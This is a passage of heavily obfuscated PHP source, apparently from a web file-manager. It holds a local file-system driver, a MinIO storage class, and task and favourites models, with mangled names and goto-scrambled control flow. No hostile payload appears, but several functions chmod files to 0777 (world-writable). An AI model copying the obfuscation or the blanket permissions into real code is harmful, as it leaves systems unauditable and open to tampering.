$this->getPathOuter($c´¡×¤ÏÖ®) : !1; goto c‰«†§Š’´; c‰«†§Š’´: } public function delFile($d‰ÓäŒÂß„) { $d‰ÓäŒÂß„ = $this->iconvSystem($d‰ÓäŒÂß„); if (!@unlink($d‰ÓäŒÂß„)) { @chmod($d‰ÓäŒÂß„, 511); if (!@unlink($d‰ÓäŒÂß„)) { return !1; } } else { return !0; } } public function delFolder($a“‰áÉšè®) { goto eÍŸ°Ö–‰Ù; eÍŸ°Ö–‰Ù: $bÃÆôÄ¾“Õ =& $_SERVER[£¶ä½¶¢]; $a“‰áÉšè® = $this->iconvSystem($a“‰áÉšè®); if (!is_dir($a“‰áÉšè®)) { return !0; } goto f¯ñÕİ¢Ú; bêƒ˜Ô¤µ: return rmdir($a“‰áÉšè®); goto cÚôáòŸ½’; f¯ñÕİ¢Ú: if (!($C¼À–é©Æµ = opendir($a“‰áÉšè®))) { return !1; } while (($a—…ô¤Ö¯Á = readdir($C¼À–é©Æµ)) !== !1) { if ($a—…ô¤Ö¯Á == $bÃÆôÄ¾“Õ[105] || $a—…ô¤Ö¯Á == $bÃÆôÄ¾“Õ[1249]) { continue; } $aĞùğ÷Ÿ–ø = $a“‰áÉšè® . $bÃÆôÄ¾“Õ[18] . $a—…ô¤Ö¯Á; if (is_file($aĞùğ÷Ÿ–ø) || is_link($aĞùğ÷Ÿ–ø)) { if (!unlink($aĞùğ÷Ÿ–ø)) { chmod($aĞùğ÷Ÿ–ø, 511); if (!unlink($aĞùğ÷Ÿ–ø)) { return !1; } } } else { if (is_dir($aĞùğ÷Ÿ–ø)) { chmod($aĞùğ÷Ÿ–ø, 511); $aĞùğ÷Ÿ–ø = $this->iconvApp($aĞùğ÷Ÿ–ø); if (!$this->delFolder($aĞùğ÷Ÿ–ø)) { return !1; } } } } closedir($C¼À–é©Æµ); goto bêƒ˜Ô¤µ; cÚôáòŸ½’: } public function rename($D·‰„‰ÀÈõ, $Có«óóì) { goto AàÛ•®ÕÈ; EôÎ’ãôÑ: $d…íÅºÈí = @rename($D·‰„‰ÀÈõ, $b‡Ïá‚ÎØä); $b‡Ïá‚ÎØä = $this->iconvApp($b‡Ïá‚ÎØä); return $d…íÅºÈí ? $this->getPathOuter($b‡Ïá‚ÎØä) : !1; goto d³† ĞíõÚ; AàÛ•®ÕÈ: $dî‹ƒì§‡— =& $_SERVER[£¶ä½¶¢]; $CšëšŸ†” = $this->fileNameAuto($this->pathFather($D·‰„‰ÀÈõ), $Có«óóì); $CšëšŸ†” = $this->iconvSystem($CšëšŸ†”); goto FâíÔî¥Êñ; FâíÔî¥Êñ: $D·‰„‰ÀÈõ = $this->iconvSystem($D·‰„‰ÀÈõ); $B•ß˜˜¶Ïİ = $this->pathFather($D·‰„‰ÀÈõ); $b‡Ïá‚ÎØä = rtrim($B•ß˜˜¶Ïİ, $dî‹ƒì§‡—[18]) . $dî‹ƒì§‡—[18] . $CšëšŸ†”; goto EôÎ’ãôÑ; d³† ĞíõÚ: } public function size($dÒ§ªªË‚) { $dÒ§ªªË‚ = $this->iconvSystem($dÒ§ªªË‚); return filesize_64($dÒ§ªªË‚); } public function info($cƒÀÉ‚Ûœã) { $cƒÀÉ‚Ûœã = $this->iconvSystem($cƒÀÉ‚Ûœã); if ($this->isFolder($cƒÀÉ‚Ûœã)) { return $this->folderInfo($cƒÀÉ‚Ûœã); } else { if ($this->isFile($cƒÀÉ‚Ûœã)) { return $this->fileInfo($cƒÀÉ‚Ûœã); } } return !1; } protected function infoChildren($AŞ¥§»êÄ, &$då‚òÜ ğË, $c‡µ‰¬íÔ« = true) { goto EçŸ«‡°‚; EçŸ«‡°‚: $F™Çáéöù =& $_SERVER[£¶ä½¶¢]; check_abort_echo(); $AŞ¥§»êÄ = rtrim($AŞ¥§»êÄ, $F™Çáéöù[18]) . $F™Çáéöù[18]; goto BàÑÌÍ“Ğ; BàÑÌÍ“Ğ: if ($c‡µ‰¬íÔ«) { $AŞ¥§»êÄ = $this->iconvSystem($AŞ¥§»êÄ); } if (!($F‹ ­“º‹ = @opendir($AŞ¥§»êÄ))) { return; } while (($e‚ğ„«»ÙŸ = readdir($F‹ ­“º‹)) !== !1) { if ($e‚ğ„«»ÙŸ == $F™Çáéöù[105] || $e‚ğ„«»ÙŸ == $F™Çáéöù[1249]) { continue; } $fã¡ÖÖÖ = $AŞ¥§»êÄ . $e‚ğ„«»ÙŸ; if (is_file($fã¡ÖÖÖ) || is_link($fã¡ÖÖÖ)) { $då‚òÜ ğË[$F™Çáéöù[89]]++; $då‚òÜ ğË[$F™Çáéöù[88]] += filesize_64($fã¡ÖÖÖ); } else { if (is_dir($fã¡ÖÖÖ)) { $då‚òÜ ğË[$F™Çáéöù[90]]++; $this->infoChildren($fã¡ÖÖÖ, $då‚òÜ ğË, !1); } } } goto càÎóÉ—ÒÉ; càÎóÉ—ÒÉ: closedir($F‹ ­“º‹); goto c—â‡àÇÂÄ; c—â‡àÇÂÄ: } private function folderInfo($fóÀóÔÂªˆ, $A‚êöŠİº = false) { $FÂÜÊ„àÕÜ =& $_SERVER[£¶ä½¶¢]; $fóÀóÔÂªˆ = rtrim($fóÀóÔÂªˆ, $FÂÜÊ„àÕÜ[18]) . $FÂÜÊ„àÕÜ[18]; $DÅ—›´Ò´› = $this->iconvApp($this->pathThis($fóÀóÔÂªˆ)); if ($A‚êöŠİº) { return array($FÂÜÊ„àÕÜ[38] => $DÅ—›´Ò´›, $FÂÜÊ„àÕÜ[86] => $this->getPathOuter($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[39] => $FÂÜÊ„àÕÜ[87]); } $F³Õ‰ŒÂ = array($FÂÜÊ„àÕÜ[38] => $DÅ—›´Ò´›, $FÂÜÊ„àÕÜ[86] => $this->getPathOuter($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[39] => $FÂÜÊ„àÕÜ[87], $FÂÜÊ„àÕÜ[204] => @filectime($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[94] => @filemtime($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[1252] => @fileatime($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[1253] => is_readable($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[1254] => is_writable($fóÀóÔÂªˆ), $FÂÜÊ„àÕÜ[1255] => get_mode($fóÀóÔÂªˆ)); return $F³Õ‰ŒÂ; } private function fileInfo($c ¨Ê–¢“, $BóËÅÍ‚Ÿé = false) { $dƒöÑÎÚ¤ =& $_SERVER[£¶ä½¶¢]; $BƒŠ½òÕ¬¾ = $this->iconvApp($this->pathThis($c ¨Ê–¢“)); if ($BóËÅÍ‚Ÿé) { return array($dƒöÑÎÚ¤[38] => $BƒŠ½òÕ¬¾, $dƒöÑÎÚ¤[86] => $this->getPathOuter($c ¨Ê–¢“), $dƒöÑÎÚ¤[39] => $dƒöÑÎÚ¤[203], $dƒöÑÎÚ¤[88] => $this->size($c ¨Ê–¢“), $dƒöÑÎÚ¤[178] => $this->ext($BƒŠ½òÕ¬¾)); } $Eï˜‹Ş’£Ğ = array($dƒöÑÎÚ¤[38] => $BƒŠ½òÕ¬¾, $dƒöÑÎÚ¤[86] => $this->getPathOuter($c ¨Ê–¢“), $dƒöÑÎÚ¤[39] => $dƒöÑÎÚ¤[203], $dƒöÑÎÚ¤[204] => @filectime($c ¨Ê–¢“), $dƒöÑÎÚ¤[94] => @filemtime($c ¨Ê–¢“), $dƒöÑÎÚ¤[1252] => @fileatime($c ¨Ê–¢“), $dƒöÑÎÚ¤[88] => $this->size($c ¨Ê–¢“), $dƒöÑÎÚ¤[178] => $this->ext($BƒŠ½òÕ¬¾), $dƒöÑÎÚ¤[1253] => is_readable($c ¨Ê–¢“), $dƒöÑÎÚ¤[1254] => is_writable($c ¨Ê–¢“), $dƒöÑÎÚ¤[1255] => get_mode($c ¨Ê–¢“)); return $Eï˜‹Ş’£Ğ; } public function exist($B´¾­ùˆÓÃ) { $B´¾­ùˆÓÃ = $this->iconvSystem($B´¾­ùˆÓÃ); return @file_exists($B´¾­ùˆÓÃ); } public function isFile($dßöĞ§Ç©õ) { $dßöĞ§Ç©õ = $this->iconvSystem($dßöĞ§Ç©õ); return @is_file($dßöĞ§Ç©õ); } public function isFolder($BïÜ¶”†‰é) { $BïÜ¶”†‰é = $this->iconvSystem($BïÜ¶”†‰é); return @is_dir($BïÜ¶”†‰é); } public function listPath($aØÃÅ’˜, $aÎŒÊ×ˆ‰Ê = false) { goto Fóî¨ôÎµ‚; Fóî¨ôÎµ‚: $D˜åó±Âñ„ =& $_SERVER[£¶ä½¶¢]; $aØÃÅ’˜ = $this->iconvSystem($aØÃÅ’˜); $aØÃÅ’˜ = rtrim($aØÃÅ’˜, $D˜åó±Âñ„[18]) . $D˜åó±Âñ„[18]; goto eÏÜÚÃö; b¨‹õ’»«ß: closedir($B®ŠÚëšÏ); return $CÃáªì˜; goto b…ì£µ½™; eÏÜÚÃö: $CÃáªì˜ = array($D˜åó±Âñ„[85] => array(), $D˜åó±Âñ„[84] => array()); if (!($B®ŠÚëšÏ = @opendir($aØÃÅ’˜))) { return $CÃáªì˜; } while (($D½‚¥°º = readdir($B®ŠÚëšÏ)) !== !1) { if ($D½‚¥°º == $D˜åó±Âñ„[105] || $D½‚¥°º == $D˜åó±Âñ„[1249]) { continue; } $B÷°Î¶ñÇŸ = $aØÃÅ’˜ . $D½‚¥°º; if (is_file($B÷°Î¶ñÇŸ)) { $CÃáªì˜[$D˜åó±Âñ„[84]][] = $this->fileInfo($B÷°Î¶ñÇŸ, $aÎŒÊ×ˆ‰Ê); } else { $CÃáªì˜[$D˜åó±Âñ„[85]][] = $this->folderInfo($B÷°Î¶ñÇŸ, $aÎŒÊ×ˆ‰Ê); } } goto b¨‹õ’»«ß; b…ì£µ½™: } public function listAll($Aˆ«Á£¶®„, &$Fë”µŒ«‹º = array()) { goto C©‘ôÒÜÉÓ; C©‘ôÒÜÉÓ: $F…Ô‚è²Ğ¥ =& $_SERVER[£¶ä½¶¢]; $Aˆ«Á£¶®„ = $this->iconvSystem($Aˆ«Á£¶®„); $Aˆ«Á£¶®„ = rtrim($Aˆ«Á£¶®„, $F…Ô‚è²Ğ¥[18]) . $F…Ô‚è²Ğ¥[18]; goto E¯ø²ÌÅˆÕ; E¯ø²ÌÅˆÕ: if (!($Fâêœ·İµ = @opendir($Aˆ«Á£¶®„))) { return $Fë”µŒ«‹º; } while (($DÔ¯Ğ•áöŒ = readdir($Fâêœ·İµ)) !== !1) { if ($DÔ¯Ğ•áöŒ == $F…Ô‚è²Ğ¥[105] || $DÔ¯Ğ•áöŒ == $F…Ô‚è²Ğ¥[1249]) { continue; } $a©¿°Ğ…¿É = $Aˆ«Á£¶®„ . $DÔ¯Ğ•áöŒ; if (is_dir($a©¿°Ğ…¿É) && !is_link($a©¿°Ğ…¿É)) { $Fë”µŒ«‹º[] = array($F…Ô‚è²Ğ¥[86] => $a©¿°Ğ…¿É . $F…Ô‚è²Ğ¥[18], $F…Ô‚è²Ğ¥[87] => 1, $F…Ô‚è²Ğ¥[94] => @filemtime($a©¿°Ğ…¿É), $F…Ô‚è²Ğ¥[88] => 0); $this->listAll($a©¿°Ğ…¿É, $Fë”µŒ«‹º); } else { $Fë”µŒ«‹º[] = array($F…Ô‚è²Ğ¥[86] => $a©¿°Ğ…¿É, $F…Ô‚è²Ğ¥[87] => 0, $F…Ô‚è²Ğ¥[94] => @filemtime($a©¿°Ğ…¿É), $F…Ô‚è²Ğ¥[88] => $this->size($a©¿°Ğ…¿É)); } } closedir($Fâêœ·İµ); goto F¹äÈ½†«; F¹äÈ½†«: return $Fë”µŒ«‹º; goto d¯ƒÈÚ¢èù; d¯ƒÈÚ¢èù: } public function has($cÒš‚ØåÌ, $cˆß†¥äÁ = false, $aÜàšŠÙ· = true) { goto a¯’ÍƒÕ·ù; D©ÙØ¶¡œµ: if ($cˆß†¥äÁ) { return array($c”Ú¢–ï±é[213] => $bô² ¤âÛ¢, $c”Ú¢–ï±é[214] => $C¥Ï‘Úôå¥); } return !1; goto bÉ´¤ØĞã½; a¯’ÍƒÕ·ù: $c”Ú¢–ï±é =& $_SERVER[£¶ä½¶¢]; $cÒš‚ØåÌ = $this->iconvSystem($cÒš‚ØåÌ); $cÒš‚ØåÌ = rtrim($cÒš‚ØåÌ, $c”Ú¢–ï±é[18]) . $c”Ú¢–ï±é[18]; goto Añİï‹ô˜; Eïˆ—ÒŸî¥: $b¾¡ƒë‘°¢ = 0; while (($EÎî›†Œ«ó = readdir($Cß¥§´ÕÙã)) !== !1) { if ($EÎî›†Œ«ó == $c”Ú¢–ï±é[105] || $EÎî›†Œ«ó == $c”Ú¢–ï±é[1249]) { continue; } $cëÕĞœ¹É± = $cÒš‚ØåÌ . $EÎî›†Œ«ó; if ($cˆß†¥äÁ) { $b¾¡ƒë‘°¢++; if (@is_file($cëÕĞœ¹É±)) { $bô² ¤âÛ¢++; } else { $C¥Ï‘Úôå¥++; } if ($b¾¡ƒë‘°¢ > 10000) { break; } continue; } if ($aÜàšŠÙ·) { if (@is_file($cëÕĞœ¹É±)) { return !0; } } else { if (@is_dir($cëÕĞœ¹É± . $c”Ú¢–ï±é[18])) { return !0; } } } closedir($Cß¥§´ÕÙã); goto D©ÙØ¶¡œµ; Añİï‹ô˜: if (!($Cß¥§´ÕÙã = @opendir($cÒš‚ØåÌ))) { return !1; } $bô² ¤âÛ¢ = 0; $C¥Ï‘Úôå¥ = 0; goto Eïˆ—ÒŸî¥; bÉ´¤ØĞã½: } public function hashSimple($DØ¼ì™Ö‹) { goto fÓæ¡É„ïâ; cèÄ•ÓÊî: if ($e³¸ÄšÄ <= $c‰ä·Å³ä× * $A¡Å£‹¡ßô) { return $this->hashMd5($DØ¼ì™Ö‹) . $e³¸ÄšÄ; } $BŠá‚ƒÄÍ® = $Fãå™öÀê†[43]; $dô‰Ê„ã = intval($e³¸ÄšÄ / $A¡Å£‹¡ßô); goto bĞèĞšø§; dÏ—½ß˜Ìô: fseek_64($DªÅ„ç‚ï©, $e³¸ÄšÄ - $c‰ä·Å³ä×); $BŠá‚ƒÄÍ® .= fread($DªÅ„ç‚ï©, $c‰ä·Å³ä×); fclose($DªÅ„ç‚ï©); goto eÜíƒ½¨ä“; fÓæ¡É„ïâ: $Fãå™öÀê† =& $_SERVER[£¶ä½¶¢]; if (!$DØ¼ì™Ö‹) { return md5($Fãå™öÀê†[43]); } $DØ¼ì™Ö‹ = $this->iconvSystem($DØ¼ì™Ö‹); goto aí¨¾·÷Ö; eÜíƒ½¨ä“: return md5($BŠá‚ƒÄÍ®) . $e³¸ÄšÄ; goto a°›à½æÎ; bĞèĞšø§: $DªÅ„ç‚ï© = fopen($DØ¼ì™Ö‹, $Fãå™öÀê†[1256]); if (!$DªÅ„ç‚ï©) { return $BŠá‚ƒÄÍ®; } for ($Fò¤ÌÛÑØÙ = 0; $Fò¤ÌÛÑØÙ < $A¡Å£‹¡ßô; $Fò¤ÌÛÑØÙ++) { fseek_64($DªÅ„ç‚ï©, $dô‰Ê„ã * $Fò¤ÌÛÑØÙ); $BŠá‚ƒÄÍ® .= fread($DªÅ„ç‚ï©, $c‰ä·Å³ä×); } goto dÏ—½ß˜Ìô; aí¨¾·÷Ö: $e³¸ÄšÄ = $this->size($DØ¼ì™Ö‹); $c‰ä·Å³ä× = 200; $A¡Å£‹¡ßô = 50; goto cèÄ•ÓÊî; a°›à½æÎ: } public function getContent($AÉèï¯†‰Õ) { $AÉèï¯†‰Õ = $this->iconvSystem($AÉèï¯†‰Õ); return file_get_contents($AÉèï¯†‰Õ); } public function setContent($Fë¶îèŸï—, $c½¦ÒÚ´ô = '') { $Fë¶îèŸï— = $this->iconvSystem($Fë¶îèŸï—); $fÔ”ñ®Ü‰É = @file_put_contents($Fë¶îèŸï—, $c½¦ÒÚ´ô, LOCK_EX); clearstatcache(); @chmod($Fë¶îèŸï—, 511); return $fÔ”ñ®Ü‰É === !1 ? !1 : !0; } public function fileSubstr($Bë¹ÛˆêÑ¯, $f²®¿ğÈå = 0, $aÊÜ°ÂŠ¥è = false) { goto AáÊÃÕ’õ; AáÊÃÕ’õ: $AêÑƒ†ªö˜ =& $_SERVER[£¶ä½¶¢]; $Bë¹ÛˆêÑ¯ = $this->iconvSystem($Bë¹ÛˆêÑ¯); if ($aÊÜ°ÂŠ¥è === !1) { $aÊÜ°ÂŠ¥è = $this->size($Bë¹ÛˆêÑ¯); } goto b±¾›Õ™é; CŒÄÑèµ†š: return $E™Áò¶§·Ñ; goto F–©´¼äÖÒ; B·—¤ëó‘: fseek_64($Dù¸ÑÁí‹Å, $f²®¿ğÈå); $E™Áò¶§·Ñ = fread($Dù¸ÑÁí‹Å, $aÊÜ°ÂŠ¥è); fclose($Dù¸ÑÁí‹Å); goto CŒÄÑèµ†š; b±¾›Õ™é: if ($aÊÜ°ÂŠ¥è <= 0) { return $AêÑƒ†ªö˜[43]; } $Dù¸ÑÁí‹Å = fopen($Bë¹ÛˆêÑ¯, $AêÑƒ†ªö˜[1256]); if (!$Dù¸ÑÁí‹Å) { return !1; } goto B·—¤ëó‘; F–©´¼äÖÒ: } public function upload($D÷…‡ƒÙ¯, $C‚×¦±„ö¾, $B°İÂ¯˜²Í = false, $AİÂèè‚¥î = REPEAT_REPLACE) { if ($B°İÂ¯˜²Í) { return $this->moveFile($C‚×¦±„ö¾, $D÷…‡ƒÙ¯); } return $this->copyFile($C‚×¦±„ö¾, $D÷…‡ƒÙ¯); } public function setModifyTime($E×¨é± õŠ, $cË…íùõîÑ = '') { @touch($E×¨é± õŠ, intval($cË…íùõîÑ)); } public function download($Aºøç¶‘¤„, $Bƒ¼òšÖ½) { return $this->iconvSystem($Aºøç¶‘¤„); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fëùìïŸ—) { parent::__construct($fëùìïŸ—); $this->signatureVersion($_SERVER[£¶ä½¶¢][222]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto c×ó¶ìÄÅÇ; dÓÌ¯ŞˆÃ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\164\x61\163\x6b\114\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\x74\171\x70\145", "\x65\166\145\156\164", "\x74\151\155\145", "\x64\145\163\x63", "\x73\171\x73\x74\x65\x6d", "\x65\156\141\142\x6c\x65", "\x6c\141\163\164\x52\165\156", "\x73\157\x72\x74"); public function listData($dˆÏÈÊŒ¡ã = false, $bÊí ¬Õõ = "\163\x6f\x72\164", $dÔ²µ½Åóˆ = false) { return parent::listData($dˆÏÈÊŒ¡ã, $bÊí ¬Õõ, $dÔ²µ½Åóˆ); } public function add($dÙÕ¶ ì¿) { $Cñ÷ø´ƒêÛ =& $_SERVER[£¶ä½¶¢]; $Cï‚‹Ç°ŸË = $this->findByName($dÙÕ¶ ì¿[$Cñ÷ø´ƒêÛ[38]]); if ($Cï‚‹Ç°ŸË) { return !1; } $dÙÕ¶ ì¿[$Cñ÷ø´ƒêÛ[1491]] = 0; $dÙÕ¶ ì¿[$Cñ÷ø´ƒêÛ[1713]] = $this->getSort(); return parent::insert($dÙÕ¶ ì¿); } private function getSort() { $eÊ‰ §ê½ƒ =& $_SERVER[£¶ä½¶¢]; $C¨‹ã‘ÕÄ = parent::listData(); $câ®÷œ¹ñ» = array_to_keyvalue($C¨‹ã‘ÕÄ, $eÊ‰ §ê½ƒ[43], $eÊ‰ §ê½ƒ[1713]); return empty($câ®÷œ¹ñ») ? 0 : max($câ®÷œ¹ñ») + 1; } public function update($fÀö·ÌÎƒé, $cÁ­ìÎÂÁí) { $aİë­ø¶âÛ =& $_SERVER[£¶ä½¶¢]; $cÊ¼—ƒÃÖÏ = $this->listData($fÀö·ÌÎƒé); $e…øŒÏ‰‰¬ = $this->findByName($cÁ­ìÎÂÁí[$aİë­ø¶âÛ[38]]); if (!$cÊ¼—ƒÃÖÏ || $e…øŒÏ‰‰¬ && $e…øŒÏ‰‰¬[$aİë­ø¶âÛ[401]] != $cÊ¼—ƒÃÖÏ[$aİë­ø¶âÛ[401]]) { return !1; } return parent::update($fÀö·ÌÎƒé, $cÁ­ìÎÂÁí); } public function remove($fÛ‹ÎÌ™’˜, $DŸŞ‹ù³çá = false) { $b¦Ì³¹óÜ =& $_SERVER[£¶ä½¶¢]; $D¿îæÖµµ‰ = $this->listData($fÛ‹ÎÌ™’˜); if (!$D¿îæÖµµ‰) { return; } if (!$DŸŞ‹ù³çá && $D¿îæÖµµ‰[$b¦Ì³¹óÜ[1168]] == $b¦Ì³¹óÜ[97]) { return !1; } return parent::remove($fÛ‹ÎÌ™’˜); } public function enable($Bƒç½½æ”Â, $D…ğÑï¬ÜÙ) { return $this->update($Bƒç½½æ”Â, array($_SERVER[£¶ä½¶¢][2100] => $D…ğÑï¬ÜÙ)); } public function run($c™ÈôƒŸ) { return $this->update($c™ÈôƒŸ, array($_SERVER[£¶ä½¶¢][2111] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\x61\166"; protected function cacheFunctionAlias($Aö¯÷½Á¿®) { $c¡ùßÈŠ‡ =& $_SERVER[£¶ä½¶¢]; return array($c¡ùßÈŠ‡[1792] => array(USER_ID, $c¡ùßÈŠ‡[2112])); } protected function listData() { $aÒÍù¬‘‡¿ =& $_SERVER[£¶ä½¶¢]; $A—ÜåÔ¥¾¢ = array($aÒÍù¬‘‡¿[1518] => USER_ID, $aÒÍù¬‘‡¿[471] => 0); $E¿Éš¬ËÃâ = $aÒÍù¬‘‡¿[2113]; $AÔ•ò¼ªğ = $this->field($E¿Éš¬ËÃâ)->where($A—ÜåÔ¥¾¢)->order($aÒÍù¬‘‡¿[2114])->select(); return $AÔ•ò¼ªğ ? $AÔ•ò¼ªğ : array(); } protected function resetCache() { } protected function listView() { goto F¯–‚êÇäØ; B¢ÄÈå„: $Cæ†Ê»ß = array_to_keyvalue($Cæ†Ê»ß, $aò®Û®Ç[403]); foreach ($E»Ç¦ëâã¿ as $b¢ÉÜÀªùÖ => $cÌÉ‚î¹½) { $BŸšÀ¹˜Ú = $Cæ†Ê»ß[$cÌÉ‚î¹½[$aò®Û®Ç[86]]]; $BŸšÀ¹˜Ú = $BŸšÀ¹˜Ú ? $BŸšÀ¹˜Ú : array(); $E»Ç¦ëâã¿[$b¢ÉÜÀªùÖ] = array_merge($BŸšÀ¹˜Ú, $cÌÉ‚î¹½); } return $E»Ç¦ëâã¿; goto fÑ¸µàªáà; Eİ¡‘»Ó¢‡: $fªóÃä†ò = array_to_keyvalue($c‰®¥æ‚È…, $aò®Û®Ç[43], $aò®Û®Ç[86]); if (!$fªóÃä†ò) { return $E»Ç¦ëâã¿; } $Aˆåß“„¼ = 2000; goto eêã¢İ¥ô¾; F¯–‚êÇäØ: $aò®Û®Ç =& $_SERVER[£¶ä½¶¢]; $E»Ç¦ëâã¿ = $this->listData(); $c‰®¥æ‚È… = array_filter_by_field($E»Ç¦ëâã¿, $aò®Û®Ç[39], $aò®Û®Ç[417]); goto Eİ¡‘»Ó¢‡; eêã¢İ¥ô¾: $EÇ‘“¸ÁÈ… = array($aò®Û®Ç[418] => array($aò®Û®Ç[419], $fªóÃä†ò)); $Cæ†Ê»ß = Model($aò®Û®Ç[798])->listSource($EÇ‘“¸ÁÈ…, $Aˆåß“„¼); $Cæ†Ê»ß = array_merge($Cæ†Ê»ß[$aò®Û®Ç[84]], $Cæ†Ê»ß[$aò®Û®Ç[85]]); goto B¢ÄÈå„; fÑ¸µàªáà: } protected function addFav($dæÜï£øÖÏ, $eÃÏëíÛƒ¹ = '', $D½§äŞ—‰– = "\163\x6f\x75\x72\143\145") { goto CßË¸êĞæ—; CßË¸êĞæ—: $aÇÔİÚ²Œ =& $_SERVER[£¶ä½¶¢]; $eÔëí®Â–÷ = array($aÇÔİÚ²Œ[1518] => USER_ID, $aÇÔİÚ²Œ[471] => 0, $aÇÔİÚ²Œ[423] => $D½§äŞ—‰–, $aÇÔİÚ²Œ[422] => $dæÜï£øÖÏ); if ($this->where($eÔëí®Â–÷)->find()) { return !1; } goto cÖ¾×³†îå; F›ÖêÉàÅ¶: if (!$eÃÏëíÛƒ¹ && $D½§äŞ—‰– == $aÇÔİÚ²Œ[417]) { $fĞÆ™×Ë²ƒ = Model($aÇÔİÚ²Œ[1203])->where(array($aÇÔİÚ²Œ[418] => $dæÜï£øÖÏ))->find(); if (!$fĞÆ™×Ë²ƒ) { return !1; } $eÃÏëíÛƒ¹ = $fĞÆ™×Ë²ƒ[$aÇÔİÚ²Œ[38]]; } $eÃÏëíÛƒ¹ = $this->getAutoName($eÃÏëíÛƒ¹); $EµĞÔ›ˆæà = array($aÇÔİÚ²Œ[1518] => USER_ID, $aÇÔİÚ²Œ[471] => 0, $aÇÔİÚ²Œ[421] => $eÃÏëíÛƒ¹, $aÇÔİÚ²Œ[422] => $dæÜï£øÖÏ, $aÇÔİÚ²Œ[423] => $D½§äŞ—‰–, $aÇÔİÚ²Œ[1694] => $C…ºØ»ùÉ÷ + 1); goto CéÃˆ½ƒËÃ; CéÃˆ½ƒËÃ: return $this->add($EµĞÔ›ˆæà); goto E÷ºßè¢; cÖ¾×³†îå: $eÔëí®Â–÷ = array($aÇÔİÚ²Œ[1518] => USER_ID, $aÇÔİÚ²Œ[471] => 0); $C…ºØ»ùÉ÷ = $this->where($eÔëí®Â–÷)->max($aÇÔİÚ²Œ[1713]); if (!$C…ºØ»ùÉ÷) { $C…ºØ»ùÉ÷ = 0; } goto F›ÖêÉàÅ¶; E÷ºßè¢: } protected function remove($DèÆêëÓÇ´) { $E¬’¦Ş‘¼Â =& $_SERVER[£¶ä½¶¢]; $d°å“î’Å = array($E¬’¦Ş‘¼Â[1518] => USER_ID, $E¬’¦Ş‘¼Â[420] => $DèÆêëÓÇ´); return $this->where($d°å“î’Å)->delete(); } protected function removeByName($B¦ùÄä¤•ó) { $EÛõ§õ  =& $_SERVER[£¶ä½¶¢]; $aîª—öÙ‘´ = array($EÛõ§õ [1518] => USER_ID, $EÛõ§õ [421] => $B¦ùÄä¤•ó, $EÛõ§õ [471] => 0); return $this->where($aîª—öÙ‘´)->delete(); } protected function rename($bÀ¶‘Ä”åî, $F¨·ä­§©) { $BË›£ˆÉ„‡ =& $_SERVER[£¶ä½¶¢]; if ($bÀ¶‘Ä”åî == $F¨·ä­§©) { return !1; } $aÇß¿¦©àğ = $this->getAutoName($F¨·ä­§©); if ($F¨·ä­§© != $aÇß¿¦©àğ) { return !1; } $c²¥åÚ‹ª• = array($BË›£ˆÉ„‡[1518] => USER_ID, $BË›£ˆÉ„‡[471] => 0, $BË›£ˆÉ„‡[38] => $bÀ¶‘Ä”åî); return $this->where($c²¥åÚ‹ª•)->save(array($BË›£ˆÉ„‡[38] => $F¨·ä­§©)); } protected function resetSort($AŠòèÖš°Ó) { $f‹ÎÑ§ïšº =& $_SERVER[£¶ä½¶¢]; $AŠòèÖš°Ó = is_array($AŠòèÖš°Ó) ? $AŠòèÖš°Ó : array(); $Aà‰‘¹³ = array($f‹ÎÑ§ïšº[1518] => USER_ID); for ($BÓË©òèóó = 0; $BÓË©òèóó < count($AŠòèÖš°Ó); $BÓË©òèóó++) { $Aà‰‘¹³[$f‹ÎÑ§ïšº[420]] = $AŠòèÖš°Ó[$BÓË©òèóó]; $this->where($Aà‰‘¹³)->save(array($f‹ÎÑ§ïšº[1694] => $BÓË©òèóó + 1)); } return !0; } protected function moveTop($C’Ó‡¡ö¾¢) { goto D÷·È‹˜; dÆš—‰±òµ: $FÂÔ³µíº = $C³ó¹ï–ä; $C³ó¹ï–ä = array_remove_value($C³ó¹ï–ä, $c¾‡à¥èñä[$cµèƒ×ÀÛ[401]]); array_unshift($C³ó¹ï–ä, $c¾‡à¥èñä[$cµèƒ×ÀÛ[401]]); goto f ×˜¬ö ä; D÷·È‹˜: $cµèƒ×ÀÛ =& $_SERVER[£¶ä½¶¢]; $b‰ˆ´äÊò = array($cµèƒ×ÀÛ[1518] => USER_ID, $cµèƒ×ÀÛ[471] => 0); $c¾‡à¥èñä = $this->where($b‰ˆ´äÊò)->where(array($cµèƒ×ÀÛ[38] => $C’Ó‡¡ö¾¢))->find(); goto c‘½±ÎÂ°; c‘½±ÎÂ°: if (!$c¾‡à¥èñä) { return; } $C³ó¹ï–ä = $this->field($cµèƒ×ÀÛ[401])->where($b‰ˆ´äÊò)->order($cµèƒ×ÀÛ[2114])->select(); $C³ó¹ï–ä = array_to_keyvalue($C³ó¹ï–ä, $cµèƒ×ÀÛ[43], $cµèƒ×ÀÛ[401]); goto dÆš—‰±òµ; f ×˜¬ö ä: return $this->resetSort($C³ó¹ï–ä); goto CÊñ ¢¶À; CÊñ ¢¶À: } protected function moveBottom($cãÌ‡¯ŒÄ³) { $c¢¯Ù•©¸ =& $_SERVER[£¶ä½¶¢]; $bó¬à¦ÔÅø = array($c¢¯Ù•©¸[1518] => USER_ID, $c¢¯Ù•©¸[471] => 0); $a¹×²ñòÚ„ = $this->where($bó¬à¦ÔÅø)->max($c¢¯Ù•©¸[1713]); $cºÀÔİºäÌ = array($c¢¯Ù•©¸[1713] => $a¹×²ñòÚ„ + 1); return $this->where($bó¬à¦ÔÅø)->where(array($c¢¯Ù•©¸[38] => $cãÌ‡¯ŒÄ³))->save($cºÀÔİºäÌ); } private function getAutoName($B”ÍİåÆËÜ) { goto Dèè«†È£‘; F…“á¶²Áƒ: $c¸ØÄ†•Õ— = array_to_keyvalue($c¸ØÄ†•Õ—, $cÀùŠ‡àÈá[43], $cÀùŠ‡àÈá[38]); if (!$c¸ØÄ†•Õ— || 